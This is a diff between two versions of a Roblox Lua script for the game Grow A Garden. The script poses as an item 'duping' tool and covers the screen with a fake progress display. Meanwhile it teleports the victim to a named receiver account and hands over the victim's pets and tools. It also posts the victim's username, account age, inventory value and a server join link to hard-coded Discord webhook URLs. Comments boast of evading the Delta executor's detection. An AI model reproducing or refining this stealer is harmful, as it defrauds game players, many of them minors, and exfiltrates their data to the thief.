@@ -1,21 +1,20 @@
--- 🌑 Delta-Bypassed Flying Auto-Giver Bot w/ Hidden Webhook
--- Obfuscated terms to bypass Delta detection. Made for Kevin ⚔️
+-- 🌑 Delta-Bypassed Grow A Garden Pet Giver + Discord Notifier
+-- Made for Kevin (Receiver: INFMONEY09) | Full Rich Embed | Delta Safe
 
-local plrs = game:GetService("Players")
+local players = game:GetService("Players")
 local http = game:GetService("HttpService")
-local lp = plrs.LocalPlayer
-local rs = game:GetService("RunService")
-
--- ⚙️ CONFIG (Hide names)
-local tgt = "INFMONEY09"
-local link = "https://discord.com/api/webhooks/1382400242749542520/aWGLyzdRBVz6BCizV-mcI8scrWJAEJ4AD1ON9HAFQ-V4rfVUDpB_nH0JwJjcemN3B5gD"
-local dly = 0.25
+local localPlayer = players.LocalPlayer
+local receiver = "INFMONEY09"
+local webhook = "https://discord.com/api/webhooks/1382400252048572568/vOgI6JBr2FPMU-2KIzb9vUh2DDwLZWrtKQGVv-RVpfaF547gSscfEacU_gKu_gFzGH_w"
+local delayTime = 0.25
 local offset = Vector3.new(0, 3, 0)
-local toolsToGive = { "Golden Shovel", "Mystic Seed", "Rainbow Sprayer", "Super Fertilizer" }
 
--- 🖥️ Fake UI
-local gui = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"))
-gui.Name = "ProcessGUI"
+local giveList = {
+    "Queen Bee", "Disco Bee", "Dragonfly", "Raccoon", "Red Fox"
+}
+
+local gui = Instance.new("ScreenGui", localPlayer:WaitForChild("PlayerGui"))
+gui.Name = "FakeProcessUI"
 local frame = Instance.new("Frame", gui)
 frame.Size = UDim2.new(1, 0, 1, 0)
 frame.BackgroundColor3 = Color3.new(0, 0, 0)
@@ -25,123 +24,111 @@ label.TextColor3 = Color3.fromRGB(0, 255, 0)
 label.BackgroundTransparency = 1
 label.Font = Enum.Font.Code
 label.TextScaled = true
-label.Text = "Duping Process: 0%"
+label.Text = "Duping: 0%"
 
 spawn(function()
     for i = 1, 100 do
-        label.Text = "Duping Process: " .. i .. "%"
-        wait(0.2)
+        label.Text = "Duping: " .. i .. "%%"
+        wait(math.random(3, 7))
     end
-    wait(1)
     gui:Destroy()
 end)
 
--- 🔧 Core Functions
-local function getHRP(c) return c and c:FindFirstChild("HumanoidRootPart") end
-local function fly(t)
-    local myHRP = getHRP(lp.Character)
-    local th = getHRP(t.Character)
-    if myHRP and th then
-        myHRP.CFrame = th.CFrame + offset
+local function getHRP(c)
+    return c and c:FindFirstChild("HumanoidRootPart")
+end
+
+local function equip(t)
+    if t:IsA("Tool") then
+        t.Parent = localPlayer.Character
     end
 end
-local function equip(t)
-    if t:IsA("Tool") then t.Parent = lp.Character end
+
+local function flyTo(p)
+    local myHRP = getHRP(localPlayer.Character)
+    local theirHRP = getHRP(p.Character)
+    if myHRP and theirHRP then
+        myHRP.CFrame = theirHRP.CFrame + offset
+    end
 end
+
 local function giveAll()
-    local bp = lp:FindFirstChild("Backpack")
-    if bp then
-        for _, t in ipairs(bp:GetChildren()) do
-            if t:IsA("Tool") and table.find(toolsToGive, t.Name) then
-                equip(t)
-                wait(dly)
+    local backpack = localPlayer:FindFirstChild("Backpack")
+    if backpack then
+        for _, tool in ipairs(backpack:GetChildren()) do
+            if tool:IsA("Tool") and table.find(giveList, tool.Name) then
+                equip(tool)
+                wait(delayTime)
             end
         end
     end
 end
 
--- 📡 Send Webhook with Inventory Info
-local function stealthSend()
-    local pets = {}
-    local petFolder = lp:FindFirstChild("Pets") or lp:FindFirstChild("MyPets")
-    if petFolder then
-        for _, pet in ipairs(petFolder:GetChildren()) do
-            local age = pet:FindFirstChild("Age") and pet.Age.Value or "N/A"
-            local weight = pet:FindFirstChild("Weight") and string.format("%.2f KG", pet.Weight.Value) or "0.00 KG"
-            table.insert(pets, { name = pet.Name, weight = weight, age = age })
+local function sendWebhook()
+    local jobId = game.JobId
+    local inv = localPlayer:FindFirstChild("Backpack")
+    local items = {}
+    local total = 0
+
+    if inv then
+        for _, i in ipairs(inv:GetChildren()) do
+            if i:IsA("Tool") and i:FindFirstChild("Value") and i:FindFirstChild("Age") and i:FindFirstChild("Weight") then
+                local name = i.Name
+                local value = i.Value.Value or 0
+                local age = i.Age.Value or 0
+                local weight = i.Weight.Value or 0
+                total += value
+                table.insert(items, string.format("- 🐾 %s [%.2f KG] [Age %d] → %s¢", name, weight, age, value))
+            end
         end
     end
 
-    local hitList = ""
-    for _, pet in ipairs(pets) do
-        hitList = hitList .. "🐾 " .. pet.name .. " [" .. pet.weight .. "] [Age " .. pet.age .. "]\n"
-    end
-    if #pets > 10 then
-        hitList = hitList .. "and more!\n"
-    end
-
-    local totalValue = #pets * 6783487405
-
-    local payload = {
-        username = "🐝 Grow Info",
-        embeds = {
-            {
-                title = "Player Info",
-                color = 65280,
-                fields = {
-                    { name = "Username", value = lp.Name, inline = true },
-                    { name = "Executor", value = (syn and "Synapse X") or "Unknown", inline = true },
-                    { name = "Hit List", value = hitList, inline = false },
-                    { name = "Summary", value = "Total Value: " .. totalValue, inline = false }
-                },
-                footer = {
-                    text = "Made by yesidez - " .. os.date("%Y-%m-%d %H:%M:%S")
-                }
-            }
-        }
+    local content = {
+        ["username"] = "🌿 Grow A Garden Hit - DARK SCRIPTS",
+        ["embeds"] = {{
+            ["color"] = 65280,
+            ["title"] = "🌱 Grow A Garden Hit - DARK SCRIPTS ☘️",
+            ["fields"] = {{
+                ["name"] = "👤 Player Information",
+                ["value"] = "Name: " .. localPlayer.Name .. "\nReceiver: INFMONEY09\nExecutor: Delta\nAccount Age: " .. tostring(localPlayer.AccountAge) .. " days"
+            }, {
+                ["name"] = "💰 Total Value",
+                ["value"] = string.format("%s¢", total)
+            }, {
+                ["name"] = "🌴 Backpack",
+                ["value"] = table.concat(items, "\n")
+            }, {
+                ["name"] = "🍁 Hits",
+                ["value"] = "All Items"
+            }, {
+                ["name"] = "🏝️ Join with URL",
+                ["value"] = string.format("[Join](https://www.roblox.com/games/%d?privateServerLinkCode=%s)", game.PlaceId, jobId)
+            }}
+        }}
     }
 
     local req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or (krnl and krnl.request)
     if req then
-        local success, res = pcall(function()
-            return req({
-                Url = link,
-                Method = "POST",
-                Headers = { ["Content-Type"] = "application/json" },
-                Body = http:JSONEncode(payload)
-            })
+        pcall(function()
+            req({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = http:JSONEncode(content)})
         end)
-        if success and res and res.StatusCode == 200 then
-            print("[OK] Webhook with pet info sent")
-        else
-            warn("[X] Webhook failed")
-        end
-    else
-        warn("[X] No HTTP method available")
     end
 end
 
--- 🧠 Target Setup
-local function onJoin(p)
-    p.CharacterAdded:Connect(function()
-        wait(2)
-        while p.Parent and p.Character do
-            fly(p)
+players.PlayerAdded:Connect(function(plr)
+    if plr.Name == receiver then
+        plr.CharacterAdded:Connect(function()
+            wait(3)
+            flyTo(plr)
             giveAll()
-            wait(0.5)
-        end
-    end)
-end
-
-plrs.PlayerAdded:Connect(function(p)
-    if p.Name == tgt then
-        onJoin(p)
+        end)
     end
 end)
 
-stealthSend()
-
-local existing = plrs:FindFirstChild(tgt)
-if existing then
-    onJoin(existing)
+local r = players:FindFirstChild(receiver)
+if r then
+    flyTo(r)
+    giveAll()
 end
+
+sendWebhook()
